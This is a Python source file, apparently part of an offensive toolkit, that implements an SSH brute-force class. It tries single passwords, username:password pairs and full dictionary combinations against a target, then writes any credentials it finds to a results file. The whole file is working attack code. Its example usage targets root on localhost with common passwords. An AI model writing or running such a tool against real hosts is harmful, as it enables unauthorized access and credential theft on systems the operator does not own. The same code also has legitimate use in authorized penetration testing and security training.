#!/usr/bin/env python3
"""
SSH Brute Force Module - Attempts to brute force SSH login credentials
"""

import paramiko
import socket
import os
import time
from datetime import datetime
from colorama import Fore, Style, init
from tqdm import tqdm

# Initialize colorama
init(autoreset=True)

class SSHBruteForce:
    """
    A class that provides SSH brute force functionality
    """

    def __init__(self):
        """Initialize the SSH brute force module"""
        self.results_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "results")

        # Create results directory if it doesn't exist
        if not os.path.exists(self.results_dir):
            os.makedirs(self.results_dir)

        # Default timeout for SSH connections
        self.timeout = 5

        # Default port for SSH
        self.port = 22

        # Success flag
        self.success = False

        # Successful credentials
        self.credentials = None

    def attempt_login(self, target, username, password):
        """
        Attempt to login to SSH with the given credentials

        Args:
            target (str): Target IP address or hostname
            username (str): Username to try
            password (str): Password to try

        Returns:
            bool: True if login successful, False otherwise
        """
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            client.connect(
                hostname=target,
                port=self.port,
                username=username,
                password=password,
                timeout=self.timeout,
                allow_agent=False,
                look_for_keys=False
            )

            # If we get here, login was successful
            client.close()
            return True

        except (paramiko.AuthenticationException, socket.error):
            # Authentication failed or connection error
            return False
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
            return False
        finally:
            if client:
                client.close()

    def brute_force_single(self, target, username, password_list_path):
        """
        Brute force SSH with a single username and a list of passwords

        Args:
            target (str): Target IP address or hostname
            username (str): Username to use
            password_list_path (str): Path to file containing passwords (one per line)

        Returns:
            tuple: (bool, str) - Success status and password if successful
        """
        try:
            # Check if password list exists
            if not os.path.exists(password_list_path):
                print(f"{Fore.RED}[!] Password list not found: {password_list_path}{Style.RESET_ALL}")
                return False, None

            # Read password list
            with open(password_list_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]

            print(f"{Fore.BLUE}[*] Starting SSH brute force attack on {target} with username '{username}'{Style.RESET_ALL}")
            print(f"{Fore.BLUE}[*] Loaded {len(passwords)} passwords from {password_list_path}{Style.RESET_ALL}")

            # Try each password
            for password in tqdm(passwords, desc="Trying passwords", unit="pwd"):
                if self.attempt_login(target, username, password):
                    print(f"\n{Fore.GREEN}[+] Success! Found valid credentials:{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}[+] Username: {username}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}[+] Password: {password}{Style.RESET_ALL}")

                    # Save results
                    self._save_results(target, username, password)

                    self.success = True
                    self.credentials = (username, password)
                    return True, password

                # Small delay to avoid overwhelming the target
                time.sleep(0.1)

            print(f"\n{Fore.RED}[!] Failed to find valid credentials for username '{username}'{Style.RESET_ALL}")
            return False, None

        except Exception as e:
            print(f"{Fore.RED}[!] Error during brute force attack: {str(e)}{Style.RESET_ALL}")
            return False, None

    def brute_force_multiple(self, target, credentials_list_path):
        """
        Brute force SSH with multiple username/password combinations

        Args:
            target (str): Target IP address or hostname
            credentials_list_path (str): Path to file containing username:password combinations (one per line)

        Returns:
            tuple: (bool, tuple) - Success status and (username, password) if successful
        """
        try:
            # Check if credentials list exists
            if not os.path.exists(credentials_list_path):
                print(f"{Fore.RED}[!] Credentials list not found: {credentials_list_path}{Style.RESET_ALL}")
                return False, None

            # Read credentials list
            with open(credentials_list_path, 'r', encoding='utf-8', errors='ignore') as f:
                credentials = []
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        username, password = line.split(':', 1)
                        credentials.append((username.strip(), password.strip()))

            print(f"{Fore.BLUE}[*] Starting SSH brute force attack on {target}{Style.RESET_ALL}")
            print(f"{Fore.BLUE}[*] Loaded {len(credentials)} credential pairs from {credentials_list_path}{Style.RESET_ALL}")

            # Try each credential pair
            for username, password in tqdm(credentials, desc="Trying credentials", unit="pair"):
                if self.attempt_login(target, username, password):
                    print(f"\n{Fore.GREEN}[+] Success! Found valid credentials:{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}[+] Username: {username}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}[+] Password: {password}{Style.RESET_ALL}")

                    # Save results
                    self._save_results(target, username, password)

                    self.success = True
                    self.credentials = (username, password)
                    return True, (username, password)

                # Small delay to avoid overwhelming the target
                time.sleep(0.1)

            print(f"\n{Fore.RED}[!] Failed to find valid credentials{Style.RESET_ALL}")
            return False, None

        except Exception as e:
            print(f"{Fore.RED}[!] Error during brute force attack: {str(e)}{Style.RESET_ALL}")
            return False, None

    def dictionary_attack(self, target, usernames_path, passwords_path):
        """
        Perform a dictionary attack using lists of usernames and passwords

        Args:
            target (str): Target IP address or hostname
            usernames_path (str): Path to file containing usernames (one per line)
            passwords_path (str): Path to file containing passwords (one per line)

        Returns:
            tuple: (bool, tuple) - Success status and (username, password) if successful
        """
        try:
            # Check if files exist
            if not os.path.exists(usernames_path):
                print(f"{Fore.RED}[!] Usernames list not found: {usernames_path}{Style.RESET_ALL}")
                return False, None

            if not os.path.exists(passwords_path):
                print(f"{Fore.RED}[!] Passwords list not found: {passwords_path}{Style.RESET_ALL}")
                return False, None

            # Read username and password lists
            with open(usernames_path, 'r', encoding='utf-8', errors='ignore') as f:
                usernames = [line.strip() for line in f if line.strip()]

            with open(passwords_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]

            print(f"{Fore.BLUE}[*] Starting SSH dictionary attack on {target}{Style.RESET_ALL}")
            print(f"{Fore.BLUE}[*] Loaded {len(usernames)} usernames and {len(passwords)} passwords{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] This may take some time...{Style.RESET_ALL}")

            # Calculate total combinations
            total = len(usernames) * len(passwords)

            # Create progress bar
            with tqdm(total=total, desc="Trying combinations", unit="combo") as pbar:
                # Try each combination
                for username in usernames:
                    for password in passwords:
                        if self.attempt_login(target, username, password):
                            print(f"\n{Fore.GREEN}[+] Success! Found valid credentials:{Style.RESET_ALL}")
                            print(f"{Fore.GREEN}[+] Username: {username}{Style.RESET_ALL}")
                            print(f"{Fore.GREEN}[+] Password: {password}{Style.RESET_ALL}")

                            # Save results
                            self._save_results(target, username, password)

                            self.success = True
                            self.credentials = (username, password)
                            return True, (username, password)

                        # Update progress bar
                        pbar.update(1)

                        # Small delay to avoid overwhelming the target
                        time.sleep(0.1)

            print(f"\n{Fore.RED}[!] Failed to find valid credentials{Style.RESET_ALL}")
            return False, None

        except Exception as e:
            print(f"{Fore.RED}[!] Error during dictionary attack: {str(e)}{Style.RESET_ALL}")
            return False, None

    def _save_results(self, target, username, password):
        """
        Save successful brute force results to a file

        Args:
            target (str): Target IP address or hostname
            username (str): Successful username
            password (str): Successful password
        """
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        target_safe = target.replace(".", "_")
        filename = f"ssh_brute_force_{target_safe}_{timestamp}.txt"
        filepath = os.path.join(self.results_dir, filename)

        with open(filepath, "w") as f:
            f.write(f"SSH Brute Force Results\n")
            f.write(f"======================\n\n")
            f.write(f"Target: {target}\n")
            f.write(f"Port: {self.port}\n")
            f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            f.write(f"Successful Credentials:\n")
            f.write(f"Username: {username}\n")
            f.write(f"Password: {password}\n")

        print(f"\n{Fore.BLUE}[*] Results saved to {filepath}{Style.RESET_ALL}")


if __name__ == "__main__":
    # Example usage
    brute_forcer = SSHBruteForce()
    # Create a sample password list for testing
    with open("sample_passwords.txt", "w") as f:
        f.write("password\n123456\nadmin\nroot\ntoor")

    # Try brute forcing with a single username
    brute_forcer.brute_force_single("127.0.0.1", "root", "sample_passwords.txt")